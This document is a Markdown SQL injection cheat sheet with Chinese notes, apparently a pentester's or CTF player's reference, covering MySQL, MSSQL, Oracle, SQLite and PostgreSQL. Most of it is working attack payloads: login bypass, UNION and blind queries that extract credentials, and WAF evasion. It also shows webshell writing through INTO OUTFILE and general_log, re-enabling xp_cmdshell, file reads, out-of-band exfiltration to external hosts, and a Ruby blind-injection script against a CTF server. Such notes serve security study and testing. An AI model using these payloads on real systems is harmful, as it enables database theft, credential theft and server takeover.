# SQL Injection
[TOC]
###### tags: `Security` `Web`

## Reference
* [⭐手動測試入門 | sushant747 OSCP guide](https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html)
* [pentestmonkey - SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
* [Sqli-labs](https://github.com/Audi-1/sqli-labs)
### cheat sheet
[portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
[portswigger training list](https://portswigger.net/training)

## Exploit Advantage
- 繞過驗證
- 撈資料庫內容
- 取得系統權限 (讀檔、RCE)

## Recon
### Where
* Cookie
* Get Parameter
* Post Parameter

### SQL vulnerable input type
- Numeric： `id=123`
    - `id=123*1` 輸出不變
    - `id=123/0` 輸出改變
    - `id=123 and 2=2` 輸出不變
    - `id=123 and 2=3` 輸出改變
- Text： `id=admin`
    - `id=admin'` 引號不匹配 輸出改變
    - `id=admin'%2b'` 字串相加 輸出不變
    - `id=admin' and '1'='1` 輸出不變
    - `id=admin' and '1'='2` 輸出改變
- Numeric Input
```
MySQL numeric function example: POW(1,1)
Oracle numeric function example: BITAND(1,1)
SQL Server numeric function example: SQUARE(1)
```
- Text Input
```
MySQL concatenation example: 'abc' 'def'
Oracle concatenation example: 'abc' || 'def'
SQL Server concatenation example: 'abc' + 'def'
```
   
### Determine DBMS
* [PortSwigger - Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)
* [sqlinjection](http://www.sqlinjection.net/database-fingerprinting/)
### Retrieve Version
`' UNION SELECT @@version-- `
* MySQL: `SELECT @@version`
* Microsoft: `SELECT @@version`
* Oracle: 
    * `SELECT banner FROM v$version WHERE rownum=1`
    * `SELECT banner FROM v$version`
    * `SELECT version FROM v$instance`
* PostgreSQL: `SELECT version()`


### Fuzzing
#### tools
* [wfuzz](https://github.com/xmendez/wfuzz)
```
wfuzz -u http://logger.htb/room.php?cod=1FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt --hc 404 # hide code 404
```

# Bypass Authenticate
## Payloads
```
' or '1'='1
```

# Retrieving Data
## Attack types
### Union-Based SQLi
合併原本 Query 的資料和想撈的資料，再把原本的 Query 消失 (z.B. 設為不存在的 index -1)，噴出想撈的東西
* [PortSwigger - UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
### Error-Based SQLi
把要撈的資料放入會噴出來的 Error Log
### Blind SQLi
* [PortSwigger - Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- Boolean-Based
    輸出可以判斷 True or False ，比對要撈的資料的長度，一個字元一個字元比對
- Time-Based
    輸出不能判斷 T/F ，改用製造時間差來判斷

### Out-of-Band SQLi
將資料透過網路外傳

## MySQL
#### **`SELECT 欄位名 FROM 庫名.表名 WHERE 條件`**

### Union-Based
Goal: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2` 
- Determining the number of columns
    - union
        - `' UNION SELECT NULL,NULL-- `
        - `' UNION SELECT 1,2,3-- `
        - 因為 UNION 資料型別必須要一致 UNION 才會成功，所以用 `NULL` 會是比較好的 (通用) 
        - 註解 `-- ` (有空白) 或是 `#` 
    - order
        - `' ORDER BY 3-- ` 找最大且沒有錯誤的數字 N
- Finding columns with a useful data type
    - 通常要 leak 的資料是 `string value`，試出哪個欄位是 `string type`
    ```
    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'--
    ```

- Retrieve interesting data
    - ` ' UNION SELECT username, password FROM users--  `
        - The injection point is a quoted string within the WHERE clause.
        - The database contains a table called users with the columns username and password. 
    - `AND 1=2 UNION SELECT 1, 2, password FROM admin-- `
- Database contents
	* `SELECT * FROM information_schema.tables`
	* `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
    - `union select 1,2,schema_name from information_schema.schemata limit 1,1` 爆資料庫名
    - `union select 1,2,table_name from information_schema.tables where table_schema='mydb' limit 0,1` 爆表名
    - `union select 1,2,column_name from information_schema.columns where table_schema='mydb' limit 0,1` 爆 Column 名
- MySQL User
    - `SELECT CONCAT(user, ":" ,password) FROM mysql.user;`
### Error-Based
- 長度限制
    - 錯誤訊息有長度限制
    - `#define ERRMSGSIZE (512)`
- Overflow
    - MySQL > 5.5.5 overflow才會有錯誤訊息
    - `SELECT ~0` => `18446744073709551615`
    - `SELECT ~0 + 1` => ERROR
    - `SELECT exp(709)` => `8.218407461554972e307`
    - `SELECT exp(710)` => ERROR
    - 若查詢成功，會返回0
        - `SELECT exp(~(SELECT * FROM (SELECT user())x));`
        - `ERROR 1690(22003):DOUBLE value is out of range in 'exp(~((SELECT 'root@localhost' FROM dual)))'`
    - `select (select(!x-~0)from(select(select user())x)a);`
        - `ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'`
        - MySQL > 5.5.53 不會顯示查詢結果
- xpath
    - extractvalue (有長度限制，32位)
        - `select extractvalue(1,concat(0x7e,(select @@version),0x7e));`
        - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
    - updatexml (有長度限制，32位)
        - `select updatexml(1,concat(0x7e,(select @@version),0x7e),1);`
        - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
- 主鍵重複
    - `select count(*) from test group by concat(version(),floor(rand(0)*2));`
        - `ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'`
- 其它函數 (5.7)
    - `select ST_LatFromGeoHash(version());`
    - `select ST_LongFromGeoHash(version());`
    - `select GTID_SUBSET(version(),1);`
    - `select GTID_SUBTRACT(version(),1);`
    - `select ST_PointFromGeoHash(version(),1);`
- 爆庫名、表名、字段名
    - 當過濾`information_schema`等關鍵字時，可以用下面方法爆庫名
        - `select 1,2,3 from users where 1=abc();`
            - `ERROR 1305 (42000): FUNCTION fl4g.abc does not exist`
    - 爆表名
        - `select 1,2,3 from users where Polygon(id);`
        - ``select 1,2,3 from users where linestring(id);``
            - ```ERROR 1367 (22007): Illegal non geometric '`fl4g`.`users`.`id`' value found during parsing```
    - 爆Column
        - `select 1,2,3 from users where (select * from  (select * from users as a join users as b)as c);`
            - `ERROR 1060 (42S21): Duplicate column name 'id'`
        - `select 1,2,3 from users where (select * from  (select * from users as a join users as b using(id))as c);`
            - `ERROR 1060 (42S21): Duplicate column name 'username'`
### Blind
- Conditional
    - `id=87 and length(user())>0`
    - `id=87 and length(user())>100`
    - `id=87 and ascii(mid(user(),1,1))>100` 第一個字元
    - `id=87 or ((select user()) regexp binary '^[a-z]')` 用正規表達式加速
- Conditional Errors
    - `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`
- Conditional Time Delays
    - sleep()
        - `SELECT sleep(10)`
    - benchmark()
    - Heavy Query
    - `id=87 and if(length(user())>0, sleep(10), 1)=1`
    - `id=87 and if(length(user())>100, sleep(10), 1)=1`
    - `id=87 and if(ascii(mid(user(),1,1))>100, sleep(10), 1)=1`
    - `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`

### Out-of-Bnad
- Windows only
- `select load_file(concat("\\\\",schema_name,".dns.kaibro.tw/a")) from information_schema.schemata`
    
### Other Knowledges
- information_schema
    出現在 mysql >= 5.0
    - `select schema_name from information_schema.schemata` 存放資料庫名
    - `select table_name from information_schema.tables` 存放表格名
    - `select column_name from information_schema.columns` 存放欄位名
    
- `LIMIT N, M` 跳過前 N 筆，抓 M 筆
    ![](https://i.imgur.com/mUvn8bT.png)

- Substring
    - `SUBSTRING("abc", 1, 1)` => 'a'
    - `mid("abc", 1, 1)  => 'a'`
- Ascii function
    - `ascii('A') => 65 `
- Char function
    - `char(65) => 'a'`
- Concatenation 合併字串
    - `CONCAT('a', 'b') => 'ab'`
        - 如果任何一欄為NULL，則返回NULL
    - `CONCAT_WS(分隔符, 字串1, 字串2...)`
        - `CONCAT_WS('@', 'gg', 'inin')` => `gg@inin`
- Cast function
    - `CAST('125e342.83' AS signed) => 125`
    - `CONVERT('23',SIGNED) => 23`
- Delay function
    - `sleep(5)`
    - `BENCHMARK(count, expr)`
- 空白字元
    - `09 0A 0B 0C 0D A0 20`
- File-read function
    - `LOAD_FILE('/etc/passwd')`
    - `TO_base64(LOAD_FILE("/var/www/html/room.php"))`
- File-write
    - `INTO DUMPFILE`
        - 適用binary (寫入同一行)
    - `INTO OUTFILE`
        - 適用一般文本 (有換行)
    - 寫webshell
        - 需知道可寫路徑
        - `UNION SELECT "<? system($_GET[1]);?>",2,3 INTO OUTFILE "/var/www/html/temp/shell.php"`
    - 權限
        - `SELECT file_priv FROM mysql.user`
    - secure-file-priv
        - 限制MySQL導入導出
            - load_file, into outfile等
        - 運行時無法更改
        - MySQL 5.5.53前，該變數預設為空(可以導入導出)
        - e.g. `secure_file_priv=E:\`
            - 限制導入導出只能在E:\下
        - e.g. `secure_file_priv=null`
            - 限制不允許導入導出
        - secure-file-priv限制下用general_log拿shell
        ```
        SET global general_log='on';

        SET global general_log_file='C:/phpStudy/WWW/cmd.php';

        SELECT '<?php assert($_POST["cmd"]);?>';
        ```
- IF語句
    - IF(condition,true-part,false-part)
    - `SELECT IF (1=1,'true','false')`
- Hex
    - `SELECT X'5061756c';  =>  paul`
    - `SELECT 0x5061756c; => paul`
    - `SELECT 0x5061756c+0 => 1348564332`
    - `SELECT load_file(0x2F6574632F706173737764);`
        - /etc/passwd
    - 可繞過一些WAF
        - e.g. 用在不能使用單引號時(`'` => `\'`)
         - CHAR()也可以達到類似效果
             - `'admin'` => `CHAR(97, 100, 109, 105, 110)`
- 註解：
    - `#`
    - `--`
    - `/**/`
        - 一個`*/`可以閉合前面多個`/*`
    - `/*! 50001 select * from test */`
        - 可探測版本
        - e.g. `SELECT /*!32302 1/0, */ 1 FROM tablename`
    - `
        - MySQL <= 5.5
    - `;`
        - PDO支援多語句

- Stacking Query
    - 預設PHP+MySQL不支援Stacking Query
    - 但PDO可以Stacking Query
- 其它：
    - @@version
        - 同version()
    - user()
        - current_user
        - current_user()
        - current user 
    - system_user()
        - database system user
    - database()
        - schema()
        - current database
    - @@basedir
        - MySQL安裝路徑
    - @@datadir
        - Location of db file
    - @@plugin_dir
    - @@hostname
    - @@version_compile_os
        - Operating System
    - @@version_compile_machine
    - @@innodb_version
    - MD5()
    - SHA1()
    - COMPRESS() / UNCOMPRESS()
    - group_concat()
        - 合併多條結果
            - e.g. `select group_concat(username) from users;` 一次返回所有使用者名
    - greatest()
        - `greatest(a, b)`返回a, b中最大的
        - `greatest(1, 2)=2`
            - 1
        - `greatest(1, 2)=1`
            - 0
    - between a and b
        - 介於a到b之間
        - `greatest(1, 2) between 1 and 3`
            - 1
    - regexp
        - `SELECT 'abc' regexp '.*'`
            - 1
    - Collation
        - `*_ci` case insensitive collation 不區分大小寫
        - `*_cs` case sensitive collation 區分大小寫
        - `*_bin` binary case sensitive collation 區分大小寫


- 繞過空白檢查
    - `id=-1/**/UNION/**/SELECT/**/1,2,3`
    - `id=-1%09UNION%0DSELECT%0A1,2,3`
    - `id=(-1)UNION(SELECT(1),2,3)`

- 寬字節注入
    - `addslashes()`會讓`'`變`\'`
    - 在`GBK`編碼中，中文字用兩個Bytes表示
        - 其他多字節編碼也可
        - 但要低位範圍有包含`0x5c`(`\`)
    - 第一個Byte要>128才是中文
    - `%df'` => `%df\'` => `運'` (成功逃逸)

- Order by注入
    - 可以透過`asc`、`desc`簡單判斷
        - `?sort=1 asc`
        - `?sort=1 desc`
    - 後面不能接UNION
    - 已知字段名 (可以盲注)
        - `?order=IF(1=1, username, password)`
    - 利用報錯
        - `?order=IF(1=1,1,(select 1 union select 2))` 正確
        - `?order=IF(1=2,1,(select 1 union select 2))` 錯誤
        - `?order=IF(1=1,1,(select 1 from information_schema.tables))` 正常
        - `?order=IF(1=2,1,(select 1 from information_schema.tables))` 錯誤
    - Time Based
        - `?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` 正常
        - `?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` sleep 2秒

- group by with rollup
    - `' or 1=1 group by pwd with rollup limit 1 offset 2#`

- 將字串轉成純數字
    - 字串 -> 16進位 -> 10進位
    - `conv(hex(YOUR_DATA), 16, 10)`
    - 還原：`unhex(conv(DEC_DATA,10,16))`
    - 需注意不要Overflow

- 不使用逗號
    - `LIMIT N, M` => `LIMIT M OFFSET N`
    - `mid(user(), 1, 1)` => `mid(user() from 1 for 1)`
    - `UNION SELECT 1,2,3` => `UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)`

- 快速查找帶關鍵字的表
    - `select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%');
    `

- innodb
    - 表引擎為innodb
    - MySQL > 5.5
    - innodb_table_stats、innodb_table_index存放所有庫名表名
    - `select table_name from mysql.innodb_table_stats where database_name=資料庫名;`
    - Example: [Codegate2018 prequal - simpleCMS](https://github.com/w181496/CTF/tree/master/codegate2018-prequal/simpleCMS)

- Bypass WAF

    - `select password` => `SelEcT password` (大小寫)
    - `select password` => `select/**/password` (繞空白)
    - `select password` => `s%65lect%20password` (URLencode)
    - `select password` => `select(password)` (繞空白)
    - `select password` => `select%0apassword` (繞空白)
        - %09, %0a, %0b, %0c, %0d, %a0
    - `select password from admin` => `select password /*!from*/ admin` (MySQL註解)
    - `information_schema.schemata` => ``` `information_schema`.schemata ``` (繞關鍵字/空白)
        - ``` select xxx from`information_schema`.schemata``` 
    - `select pass from user where id='admin'` => `select pass from user where id=0x61646d696e` (繞引號)
        - `id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e))`
    - `?id=0e2union select 1,2,3` (科學記號)
        - `?id=1union select 1,2,3`會爛
        - `?id=0e1union(select~1,2,3)` (~)
        - `?id=.1union select 1,2,3` (點)
    - `WHERE` => `HAVING` (繞關鍵字)
    - `AND` => `&&` (繞關鍵字)
        - `OR` => `||`
        - `=` => `LIKE`
        - `a = 'b'` => `not a > 'b' and not a < 'b'`
        - `> 10` => `not between 0 and 10`
    - `LIMIT 0,1` => `LIMIT 1 OFFSET 0` (繞逗號)
        - `substr('kaibro',1,1)` => `substr('kaibro' from 1 for 1)`
    - Multipart/form-data繞過
        - http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/
    - 偽造User-Agent
        - e.g. 有些WAF不封google bot

## MSSQL
### Union-Based
- Column型態必須相同 可用`NULL`來避免
- Database contents
	* `SELECT * FROM information_schema.tables`
	* `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
### Error-Based
- 利用型別轉換錯誤
- `id=1 and user=0`
### Blind
- Conditional Errors
    - `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
- Conditional Time Delays
    - `MAIT FOR DELAY '0:0:10'`
    - `WAITFOR DELAY '0:0:10'`
    - `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
 
### Other Knowledges 
- 子字串：
    - `SUBSTRING("abc", 1, 1) => 'a'`
- Ascii function
    - `ascii('A') => 65 `
- Char function
    - `char(65) => 'a'`
- Concatenation
    - `+`
    - `'a'+'b' => 'ab'`
- 空白字元
    - `01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20`
- IF語句
    - IF condition true-part ELSE false-part
    - `IF (1=1) SELECT 'true' ELSE SELECT 'false'`
- 註解：
    - `--`
    - `/**/`
- TOP
    - MSSQL沒有`LIMIT N, M`的用法
    - `SELECT TOP 87 * FROM xxx` 取最前面87筆
    - 取第78~87筆
        - `SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87`
- 其它：
    - db_name()
    - user_name()
    - @@servername
    - host_name()
- 爆DB name
    - ```DB_NAME(N)```
    - ```UNION SELECT NULL,DB_NAME(N),NULL--```
    - ```UNION SELECT NULL,name,NULL FROM master ..sysdatabases--```
    - `SELECT catalog_name FROM information_schema.schemata`
    - ```1=(select name from master.dbo.sysdatabases where dbid=5)```
- 爆表名
    - `SELECT table_catalog, table_name FROM information_schema.tables`
    - `SELECT name FROM sysobjects WHERE xtype='U'`
    - `ID=02';if (select top 1 name from DBname..sysobjects where xtype='U' and name not in ('table1', 'table2'))>0 select 1--`

- 爆column
    - `SELECT table_catalog, table_name, column_name FROM information_schema.columns`
    - `SELECT name FROM syscolumns WHERE id=object_id('news')`
    - `ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)>0 select 1--`
   
- 判斷是否站庫分離
    - 客戶端主機名：`select host_name();`
    - 服務端主機名：`select @@servername; `
    - 兩者不同即站庫分離

- xp_cmdshell
    - 在MSSQL 2000默認開啟
    - MSSQL 2005之後默認關閉
    - 有sa權限，可透過sp_configure重啟它
    
    ```
    EXEC sp_configure 'show advanced options',1
    RECONFIGURE 
    EXEC sp_configure 'xp_cmdshell',1
    RECONFIGURE
    ```
    - 關閉xp_cmdshell
    
    ```
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure'xp_cmdshell', 0;
    RECONFIGURE;
    ```

- 快速查找帶關鍵字的表
    - `SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%');`

- Unicode繞過
    - IIS 對 Unicode 編碼是可以解析的，即 s%u0065lect 會被解析為 select

## Oracle
### UNION-Based
- Determining the number of columns
    - Column 型態必須相同，可用`NULL`來避免
    - 所有的 `SELECT` 必須包含有效的 `FROM` 
    - `UNION SELECT 1, 'aa', null FROM dual`
- Database contents
    - 庫名
        - `SELECT DISTINCT OWNER FROM ALL_TABLES`
    - 表名
        - `' UNION SELECT table_name,NULL FROM all_tables--`
        - `SELECT OWNER, TABLE_NAME FROM ALL_TABLES`
    - Column
        - `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--`
        - `SELECT OWNER, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS`
        
- Retrieve interesting data
    - `' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--`
### Error-Based
- `SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1`
### Blind
- Conditional Errors
    - `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual`
- Conditional Time Delay
    - `dbms_pipe.receive_message(('a'),10)`
    - `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
### Out-of-band
- `UTL_HTTP.request('http://kaibro.tw/'||(select user from dual))=1`
### Other Knowledge
- substring
    - `SUBSTR("abc", 1, 1) => 'a'`
- 空白字元
    - `00 0A 0D 0C 09 20`
- semicolon
    - `%3b`
- IF語句
    - `IF condition THEN true-part [ELSE false-part] END IF`
- 註解：
    - `--`
- 連接字串：
    - `||`
- OFFSET
    - SELECT owner FROM all_tables OFFSET 1 ROWS
- 其它
    - `SYS.DATABASE_NAME`
        - current database
    - `USER`
        - current user

https://www.oracletutorial.com/oracle-basics/oracle-fetch/
https://www.oracletutorial.com/oracle-administration/oracle-show-tables/

## SQLite
### Blind
- Boolean Based
    - SECCON 2017 qual SqlSRF
```ruby
# encoding: UTF-8

# sqlite injection (POST method) (二分搜)
# SECCON sqlsrf爆admin密碼 
require 'net/http'
require 'uri'

$url = 'http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi'
$ans = ''

(1..100).each do |i|
    l = 48
    r = 122

    while(l <= r)
        #puts "left: #{l}, right: #{r}"
        break if l == r

        mid = ((l + r) / 2)
        $query = "kaibro'union select '62084a9fa8872a1b917ef4442c1a734e' where (select unicode(substr(password,#{i},#{i})) from users where username='admin') > #{mid} and '1'='1"
        
        res = Net::HTTP.post_form URI($url), {"user" => $query, "pass" => "kaibro", "login" => "Login"}
        
        if res.body.include? 'document.location'
            l = mid + 1
        else
            r = mid
        end

    end
    $ans += l.chr
    puts $ans

end
```

### Other Knowledge
- 子字串：
    - `substr(“abc",1,1)   =>   'a'`
- Ascii function:
    - `unicode('d') => 100`
- legth
    - `length('ab') => 2`
- Concatenation
    - `||`
    - `'a' || 'b' => 'ab'` 
- Time Delay
    - `randomblob(100000000)`
- 空白字元
    - `0A 0D 0C 09 20`
- Case when
    - SQLite沒有`if`
    - 可以用`Case When ... Then ...`代替
    - `case when (條件) then ... else ... end`
- 註解
    - `--`
- 爆表名
    - `SELECT name FROM sqlite_master WHERE type='table'`
- 爆表結構(含Column)
    - `SELECT sql FROM sqlite_master WHERE type='table'`
- 其他
    - `sqlite_version()`
    - sqlite無法使用`\'`跳脫單引號


## PostgreSQL
### Union-Based
- Database contents
	* `SELECT * FROM information_schema.tables`
        ```
        TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
        =====================================================
        MyDatabase dbo Products BASE TABLE
        MyDatabase dbo Users BASE TABLE
        MyDatabase dbo Feedback BASE TABLE
        ```
	* `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
        ```
        TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
        =================================================================
        MyDatabase dbo Users UserId int
        MyDatabase dbo Users Username varchar
        MyDatabase dbo Users Password varchar
        ```
### Blind
- Conditional Errors
    - `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`
- Conditional Time Delay
    - `pg_sleep()`
    - `repeat()`
    - `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
### Other Knowledge
- Substring
    - `substr("abc", 1, 1) => 'a'`
- semicolon
    - `%3b`
- Ascii function
    - `ascii('x') => 120`
- Char function
    - `chr(65) => A`
- Concatenation
    - `||`
    - `'a' || 'b' => 'ab'`
- Delay function
    - `pg_sleep(5)`
    - `GENERATE_SERIES(1, 1000000)`
    - `repeat('a', 10000000)`
- 空白字元
    - `0A 0D 0C 09 20`
- encode / decode
    - `encode('123\\000\\001', 'base64')` => `MTIzAAE=`
    - `decode('MTIzAAE=', 'base64')` => `123\000\001`
- 不支援 limit N, M
    - `limit a offset b` 略過前 b 筆，抓出 a 筆出來
- 註解
    - `--`
    - `/**/`
- 爆庫名
    - `SELECT datname FROM pg_database`
- 爆表名
    - `SELECT tablename FROM pg_tables WHERE schemaname='dbname'`
- 爆Column
    - `SELECT column_name FROM information_schema.columns WHERE table_name='admin'`

- Dump all 
    - `array_to_string(array(select userid||':'||password from users),',')`
- 其它
    - version()
    - current\_database()
    - user
        - current_user
        - `SELECT usename FROM pg_user;`
    - current\_schema
    - current\_query()
    - inet\_server\_addr()
    - inet\_server\_port()
    - inet\_client\_addr()
    - inet\_client\_port()
    - type conversion
        - `cast(count(*) as text)`
    - `md5('abc')`
    - `replace('abcdefabcdef', 'cd', 'XX')` => `abXXefabXXef`
    - `pg_read_file(filename, offset, length)`
        - 讀檔
        - 只能讀data_directory下的
    - `pg_ls_dir(dirname)`
        - 列目錄內容
        - 只能列data_directory下的
    - PHP的`pg_query()`可以多語句執行
    - `lo_import()`, `lo_get()`讀檔
        - `select cast(lo_import('/var/lib/postgresql/data/secret') as text)` => `18440`
        - `select cast(lo_get(18440) as text)` => `secret_here`

# Other
## ORM injection
https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications

- Hibernate
    - 單引號跳脫法
        - MySQL中，單引號用`\'`跳脫
        - HQL中，用兩個單引號`''`跳脫
        - `'abc\''or 1=(SELECT 1)--'`
            - 在HQL是一個字串
            - 在MySQL是字串+額外SQL語句
    - Magic Function法
        - PostgreSQL中內建`query_to_xml('Arbitary SQL')`
        - Oracle中有`dbms_xmlgen.getxml('SQL')`

HQL injection example (pwn2win 2017)

- ```order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select table_name from information_schema.columns limit 1)))',true,false,'')),1)```
    - Output: `ERROR: could not stat file "flag": No such file or directory`

- ```order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select column_name from information_schema.columns limit 1)))',true,false,'')),1)```
    - Output: `ERROR: could not stat file "secret": No such file or directory`
- `order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select secret from flag)))',true,false,'')),1)`
    - Output: `ERROR: could not stat file "CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}": No such file or directory`


## SQL Injection with MD5

- `$sql = "SELECT * FROM admin WHERE pass = '".md5($password, true)."'";`
- ffifdyop
    - md5: `276f722736c95d99e921722cf9ed621c`
    - to string: `'or'6<trash>`

## HTTP Parameter Pollution

- `id=1&id=2&id=3`
    - ASP.NET + IIS: `id=1,2,3`
    - ASP + IIS: `id=1,2,3`
    - PHP + Apache: `id=3`

# TEMP
about information_schema
https://portswigger.net/web-security/sql-injection/examining-the-database
